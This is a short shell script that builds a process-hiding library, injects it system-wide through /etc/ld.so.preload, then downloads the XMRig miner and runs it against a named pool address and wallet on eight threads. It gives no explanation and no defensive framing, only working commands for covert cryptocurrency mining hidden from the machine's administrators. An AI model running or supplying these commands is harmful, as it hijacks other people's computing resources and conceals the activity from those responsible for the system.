sudo apt install make -y && sudo apt install gcc -y
git clone https://github.com/chikahusarii/lemon-lide.git && cd lemon-lide && make
sudo mv libprocesshider.so /usr/local/lib/
sudo su
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz && tar -xvf xmrig-6.18.0-focal-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o 20.218.132.68:5433 -u TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM -p x -k --coin monero -a rx/0 --threads=8
